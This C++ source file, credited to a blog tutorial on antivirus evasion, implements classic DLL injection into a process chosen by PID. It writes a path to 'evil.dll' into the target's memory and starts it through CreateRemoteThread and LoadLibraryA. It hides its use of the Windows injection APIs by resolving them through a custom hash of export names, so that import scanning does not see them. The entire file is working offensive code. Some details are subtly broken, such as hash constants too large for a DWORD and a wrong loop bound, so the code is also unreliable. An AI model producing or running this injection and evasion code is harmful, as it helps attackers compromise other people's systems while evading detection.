/*
 * hack.cpp - Classic DLL injection + hashing Win32API functions. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/tutorial/2022/03/22/simple-av-evasion-5.html
*/
#include <windows.h>
#include <stdio.h>

typedef HANDLE (WINAPI* fnOpenProcess)(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);

typedef LPVOID(WINAPI* fnVirtualAllocEx) (
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

typedef BOOL(WINAPI* fnWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

typedef HANDLE (WINAPI* fnCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

DWORD calcMyHash(char* data) {
  DWORD hash = 0x35;
  for (int i = 0; i < strlen(data); i++) {
    hash += data[i] + (hash << 1);
  }
  return hash;
}

static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
    (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
  PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

    if (calcMyHash(pFuncName) == myHash) {
      printf("successfully found! %s - %d\n", pFuncName, myHash);
      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
    }
  }
  return nullptr;
}

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  unsigned long OpenProcessA;
  unsigned long VirtualAllocExA;
  unsigned long WriteProcessMemoryA;
  unsigned long CreateRemoteThreadA;

  if ( atoi(argv[1]) == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  }
  printf("PID: %i\n", atoi(argv[1]));

  LPVOID op_addr = getAPIAddr(hKernel32, (DWORD)17260444);
  fnOpenProcess myOpenProcess = (fnOpenProcess)op_addr;
  printf("0x%p\n", op_addr);
  HANDLE ph = myOpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  LPVOID va_addr = getAPIAddr(hKernel32, (DWORD)476716998);
  fnVirtualAllocEx myVirtualAllocEx = (fnVirtualAllocEx)va_addr;
  printf("0x%p\n", va_addr);
  LPVOID rb = myVirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  LPVOID wpm_addr = getAPIAddr(hKernel32, (DWORD)38970534946);
  fnWriteProcessMemory myWriteProcessMemory = (fnWriteProcessMemory)wpm_addr;
  printf("0x%p\n", wpm_addr);
  myWriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  LPVOID crt_addr = getAPIAddr(hKernel32, (DWORD)36268531897);
  fnCreateRemoteThread myCreateRemoteThread = (fnCreateRemoteThread)crt_addr;
  printf("0x%p\n", crt_addr);
  HANDLE rt = myCreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);

  CloseHandle(ph);

  OpenProcessA = GetProcAddress(hKernel32, "OpenProcess");
  printf("OpenProcess address in memory is: 0x%08p\n", OpenProcessA);

  VirtualAllocExA = GetProcAddress(hKernel32, "VirtualAllocEx");
  printf("VirtualAllocExA address in memory is: 0x%08p\n", VirtualAllocExA);

  WriteProcessMemoryA = GetProcAddress(hKernel32, "WriteProcessMemory");
  printf("WriteProcessMemory address in memory is: 0x%08p\n", WriteProcessMemoryA);

  CreateRemoteThreadA = GetProcAddress(hKernel32, "CreateRemoteThread");
  printf("CreateRemoteThread address in memory is: 0x%08p\n", CreateRemoteThreadA);
  return 0;
}
